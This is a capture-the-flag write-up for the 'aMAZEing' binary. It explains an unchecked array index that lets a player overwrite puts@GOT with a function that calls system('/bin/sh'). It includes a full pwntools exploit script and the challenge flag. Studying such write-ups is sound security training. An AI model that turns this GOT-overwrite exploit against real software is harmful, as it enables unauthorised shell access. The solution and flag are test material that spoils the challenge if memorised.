## Challenge Overview

**aMAZEing** is a binary maze game challenge where logic, memory, and vulnerability exploitation come together. The objective is to escape the maze â€” not through solving it, but by exploiting a flaw in its internal logic.

---

## Binary Details

```bash
$ file maze
maze: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

```bash
$ checksec maze
[*] '/home/user/Desktop/aMAZEing/maze'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    Stripped: No
```

### Security Summary

| Protection   | Status  |
| ------------ | ------- |
| RELRO        | Partial |
| Stack Canary | Yes     |
| NX           | Enabled |
| PIE          | Enabled |

## Vulnerability Analysis

The program allows the player to configure "coordinates" and "slot values" in the maze. Internally, the game logic uses a buffer called `maze_escape[]`, and inputs are used directly as indices without bounds checks.

```c
scanf("%d", &coordinates);
scanf("%d", &slot);
maze_escape[coordinates] = slot;
```

### Vulnerability: Out-of-Bounds Write

- There is no bounds check on the `coordinates` variable.
- This allows writing to memory beyond the intended array `maze_escape[]`.
- Specifically, it enables overwriting entries in the Global Offset Table (GOT), such as `puts@GOT`.
- By overwriting a GOT entry with the address of the `escape()` function, control flow is redirected to spawn a shell.

---

## Exploitation Plan

1. **Leak the PIE base address**: At startup, the binary prints the runtime address of `main()`, which can be used to calculate the full base address.
2. **Calculate offset to GOT**: Determine how far `puts@GOT` is from `maze_escape[]` in memory.
3. **Overwrite GOT entry**: Use the out-of-bounds vulnerability to overwrite the `puts@GOT` entry with the address of the `escape()` function.
4. **Trigger puts()**: The program will now call `escape()` instead, which executes `system("/bin/sh")`.

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'maze')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''

#io = start()
io = remote('localhost', 1337)

# Leak PIE base address
io.recvuntil(b'The maze begins at this location, your journey starts here @')
leak = io.recvline().strip()
main_leak = int(leak, 16)
exe.address = main_leak - exe.sym['main']

log.success(f'PIE base: {hex(exe.address)}')
log.success(f'maze_escape: {hex(exe.sym["maze_escape"])}')
log.success(f'puts@GOT: {hex(exe.got["puts"])}')
log.success(f'escape(): {hex(exe.sym["escape"])}')

# Calculate offset
offset = (exe.got['puts'] - exe.sym['maze_escape']) // 4

# Overwrite GOT entry
io.sendlineafter(b'Configure coordinates (0 >=) : ', str(offset).encode())
io.sendlineafter(b'Set slot value (10 >=) : ', str(exe.sym['escape']).encode())

# Trigger the overwritten function
io.sendlineafter(b'Configure coordinates (0 >=) : ', b'0')

io.interactive()
```

---

## Result

The overwritten GOT entry causes the program to call `escape()`, which executes:

```c
system("/bin/sh");
```

A shell is spawned, granting access to the system and allowing flag retrieval.

## Flag

```
flag{l0st_1n_th3_4m4z3_w1th_r34l_sh3ll}
```
